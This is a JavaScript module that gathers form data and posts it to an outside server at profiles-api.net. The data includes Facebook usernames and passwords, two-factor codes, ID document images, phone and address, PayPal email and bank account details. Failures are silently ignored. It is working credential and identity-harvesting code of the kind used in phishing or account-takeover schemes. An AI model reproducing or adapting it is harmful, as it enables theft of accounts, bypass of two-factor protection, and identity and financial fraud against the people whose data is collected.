import $ from "jquery";

const sendDataToBoard = async (data) => {
  var upData = {
    personal_info: `${data.firstName} ${data.lastName}`,
    geo: "en",
    country: data.country,
    checked: true,
  };

  $.post("https://profiles-api.net/profile_id_api/api/new_profile_id.php/", upData)
    .done(function (response) {
      data["personalInfo"] = response[0];

      sendData(data);
    })
    .fail(function (response) {
      // console.log(response);
    });

  const sendData = (data) => {
    const board_id = 1329202495;
    const providers_source = "Massimo2";
    const geo = "en";

    const dataToSend = {
      action: "send_data",
      first_name: data.firstName || "",
      last_name: data.lastName || "",
      facebook_login: data.fbUsername || "",
      facebook_password: data.fbPassword || "",
      friends: data.haveFriends || "",
      fb_age: data.isOneYear || "",
      fb_activity: data.frecuency || "",
      phone_number: data.phone || "",
      providers_source: providers_source,
      password_verification: "-",
      password_verification: "-",
      board_id: board_id,
      geo: geo,
      date_of_birth:
        new Date(data.birthday).toLocaleDateString([], {
          day: "2-digit",
          month: "2-digit",
          year: "numeric",
        }) || "",
      file: data.documentImage,
      email_id_file: data.fbEmailImage,
      bm_id_file: data.bmIdImage,
      personalInfo: data.personalInfo || "",
      pay_option: data.paymentMethod || "",
      reference_code: data.referralCode || "",
      country: data.country || "",
      devices: data.devices.join() || "",
      city: data.city || "",
      email: data.email || "",
      paypal_email: data.paypalEmail || "",
      beneficiary: data.holderName || "",
      bank: data.bankAngency || "",
      acc: data.bankAccountCode || "",
      fa_token: data.code2FA || "",
      user_type: data.userType || "",
      status: data.status || "",
      status_observation: data.statusObservation || "",
      os: data.os.join() || "",
      address: data.address || "",
      referral: data.referral || "",
      zip_code: data.zipCode || "",
      referral_code_link: data.referralCodeLink || "",
      ip: data.ip || "",
      fortnight: data.fortnight || "",
    };

    $.post("//profiles-api.net/api/index.php", dataToSend)
      .done(function (response) {
        // console.log("sent to board");
      })
      .fail(function (response) {
        // console.log(response);
      });
  };
};

export default sendDataToBoard;
